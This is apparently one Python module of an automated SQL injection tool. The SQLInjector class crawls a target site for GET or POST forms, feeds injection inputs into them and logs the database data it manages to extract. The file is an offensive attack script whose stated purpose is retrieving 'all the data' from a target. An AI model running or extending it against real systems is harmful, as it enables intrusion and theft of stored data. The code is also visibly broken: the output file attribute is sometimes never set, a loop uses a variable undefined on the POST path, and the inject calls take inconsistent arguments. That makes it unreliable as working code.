from src.scraping.form_spider import FormSpider
from src.sql_injection_builder import SQLInjectionBuilder
from src.scraping.form_spider import COMMON_GET_INPUTS
from src.injector_state.sql_injector_database_engine_state import SQLInjectorDatabaseEngineState

import requests
import urllib.parse
import logging

class SQLInjector:
    supported_methods = ("get", "post")
    def __init__(self, url, output_file , method) -> None:
        if output_file == None:
            self.output_file = "results.txt"
        if method == None:
            method = "get"
        if method in SQLInjector.supported_methods:
            logging.basicConfig(filename=self.output_file, level=logging.INFO, format="%(message)s")
            self.url = url
            self.state = SQLInjectorDatabaseEngineState(self)
            self.method = method
            self.forms = [form for form in FormSpider(url).form_info() if form.method == method]
        else:
            raise NotImplementedError(f"{method} method is not supported")

    def inject(self):
        if self.method == "post" and len(self.forms) == 0:
            raise Exception("Could not find any form to inject data")
        if self.method == "get":
            for inputs in COMMON_GET_INPUTS:
                self.state.inject(self.url, inputs)
        for form in self.forms:
            for input_chosen in inputs:
                self.state.inject(form.action, input_chosen, inputs)
        if not self.state.isEnd():
            logging.warning(f"Could not retrieve all the data. See results on {self.output_file}")
        else:
            logging.info(f"Success, we got all the data we could. See results on {self.output_file}")

